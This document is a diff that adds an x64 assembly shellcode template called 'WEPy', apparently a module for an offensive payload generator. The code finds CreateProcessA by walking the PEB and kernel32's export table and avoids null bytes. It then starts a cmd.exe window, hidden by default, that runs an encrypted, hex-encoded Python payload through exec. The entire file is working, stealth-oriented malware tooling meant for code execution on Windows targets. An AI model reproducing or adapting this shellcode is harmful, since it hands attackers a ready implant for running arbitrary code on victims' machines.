@@ -1,0 +1,189 @@
+#!name##WEPy
+#!types##scode
+#!info##A shellcode that uses the CreateProcessA function. By default, it launches CMD and injects a Python script into it. The shellcode includes a section for a Python payload, which will be automatically converted into hexadecimal values. You can also replace the default loader (code executor) with your own custom implementation.
+#!NullBytes##True
+#!system_FLAG##[W]
+#!TAGS##[SCode]
+#!reqPayload##WEPy_script##Python script
+#!payloadOpt##WEPy_script##INCLUDE_IMPORTS##True##Include import library in code
+#!Payload##WEPy_script##step##return_code
+#!Payload##WEPy_script##step##encode_to_hex
+
+#!reqVar##WEPy_executor##How to run a python script. The '$' character denotes a script. Default: cmd.exe /C python -c exec(bytes.fromhex('$'))##str
+#!setVar##WEPy_executor##cmd.exe /C python -c exec(bytes.fromhex('$'))##str
+#!reqVar##WEPy_hide##A parameter that determines whether the CreateProcessA execution will run the code in a visible CMD window or keep it hidden. Accepts "True" or "False"; by default, the execution is hidden.##str
+#!setVar##WEPy_hide##True##str
+
+
+
+
+{% set WEPy_evil_script = TOOL.cmd_build_loader(WEPy_script, WEPy_executor) %}
+
+{% if WEPy_hide == "True" %}
+%define SHOW_PROCESS 0x08000000
+{% else %}
+%define SHOW_PROCESS 0
+{% endif %}
+
+BITS 64
+
+
+section .text
+global main
+main:
+    mov rbp, rsp; for correct debugging
+    ; CreateProcessA
+    mov rax, 0x000041737365636f
+    push rax
+    mov rax, 0x7250657461657243
+    push rax
+    mov rcx, rsp
+    lea rdx, [rel GetData]
+    jmp DuckTales
+
+GetData:
+    add rsp, 16
+    call CrProc
+    db {{TOOL.asm_hex_encrypt_bytes(WEPy_evil_script)}}
+
+CrProc:
+    pop r14 ; get args
+    mov r15, rax    ; save func addr
+    
+    ; create STARTUPINFO struct and fill zeros
+    sub rsp, 128    ; make 128 bytes
+    lea rdi, [rsp]    ; buff addr
+    mov ecx, 128  / 8   ; bytes number
+    xor rax, rax    ; value
+    ;cld
+    rep stosq
+    
+    lea r10, [rsp]  ; save pointer to struct. This same: mov r10, rsp
+    mov dword [r10], 104
+    
+    ; create PROCESS_INFORMATION structure and fill zeros
+    sub rsp, 32
+    mov rdi, rsp    ; buff addr
+    mov ecx, 32 / 8   ; bytes num
+    xor rax, rax
+    cld
+    rep stosq
+    
+    lea r11, [rsp]  ; save pointer to struct. This same: mov r10, rsp
+    
+
+    ; CreateProcessA
+    mov rdx, rsp
+    sub rsp, 88
+    xor rcx, rcx
+    mov rdx, r14
+    mov r8, 0
+    mov r9, 0
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], SHOW_PROCESS
+    mov qword [rsp+48], 0
+    mov qword [rsp+56], 0
+    mov [rsp+64], r10
+    mov [rsp+72], r11
+    call r15
+    
+    add rsp, 88 + 160 
+  
+    ret
+
+
+DuckTales:
+    ; find function name and back
+    ; Null bytes free
+    ; IN: rcx - pointer to function name
+    ; IN: rdx - pointer to callback
+    ; OUT: rax - function address
+    
+    push rbp
+    mov rbp, rsp
+    push rsi
+    push rdi
+    push r14
+    push r15
+    sub rsp, 16     ; space for local variable
+    mov [rbp-8], rcx    ; function name
+    mov [rbp-16], rdx   ; return address
+    
+    ; get kernel32 and Export Table address
+    ; r14 - kernel32 addr
+    ; r15 - export table
+    xor rcx, rcx
+    mov rcx, gs:[rcx+0x60]  ; Get address of PEB struct (avoid null bytes)
+    mov rcx, [rcx+0x18]     ; Get PEB_LDR_DATA address
+    mov rcx, [rcx+0x20]     ; Get InMemoryOrderModuleList
+    mov rcx, [rcx]      ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
+    mov rcx, [rcx]      ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
+    mov r14, [rcx+0x20] ; Get kernel32.dll address
+    
+    xor rcx, rcx
+    mov ecx, [r14+0x3c] ; get pointer to PE header  (pointer have RVAddress )
+    add rcx, r14    ; RVA PE header + kernel32 = VA PE header of kernel32
+    add rcx, 0x44
+    add rcx, 0x44   ;  0x88 bytes after the PE signature is the RVA for the Export Table
+    mov r15d, [rcx]  ; get RVA of Export Table
+    add r15, r14    ; RVA export table + VA kernel32 = VA export table
+    
+    mov r8d , [r15+0x14]     ; get number of function
+    xor rdx, rdx    ; 'function number' counter
+    xor r9, r9
+    xor rcx, rcx  ; 
+    ; r8 - number of function
+    ; rdx - actual function number
+    ; r10 - length function name
+    xor r10, r10    ; str len counter
+    mov rax, [rbp-8]
+    .match_len:
+        mov byte cl, [rax+r10]
+        cmp cl, r9b
+        je .find_name
+        inc r10
+        jmp .match_len
+    
+    .find_name:
+        cmp rdx, r8     ; check function limit
+        jg .not_find
+        mov esi, [r15+0x20]     ; RVA function name from export table
+        add rsi, r14        ; RVA function name + VA kernel32 = VA function name
+        mov esi, [rsi+4*rdx]    ; get next entry RVA function name
+        add rsi, r14        ; RVA name + kernel32 addr
+        ; rsi = function name from export table
+        ; compare function name
+        mov rdi, [rbp-8]    ; our func name
+        mov rcx, r10    ; func name length
+        cld
+        repe cmpsb
+        jnz .check_next
+        
+        ; get function addres
+        mov edi, [r15+0x24]     ; get AddressOfNameOrdinals RVA
+        add rdi, r14        ; AddressOfNameOrdinals RVA + kernel32 VA
+        xor rsi, rsi
+        mov si, [rdi+2*rdx]    ; get function index (word) to function address
+        mov edi, [r15+0x1c]     ; get AddressOfFunctions RVA
+        add rdi, r14    ; AddressOfFunctions RVA + kernel32 VA
+        mov edi, [rdi+4*rsi]    ; get RVA function address
+        add rdi, r14    ; function addr RVA + kernel32 VA
+        mov rax, rdi    ; return func addr
+    
+    .return:
+        mov rcx, [rbp-16]   ; return addr
+        add rsp, 16 ; restore stack
+        pop r15
+        pop r14
+        pop rdi
+        pop rsi
+        pop rbp
+        jmp rcx
+     
+     .not_find:
+        xor rax, rax
+        jmp .return
+        
+    .check_next:
+        inc rdx     ; increase main func counter
+        jmp .find_name
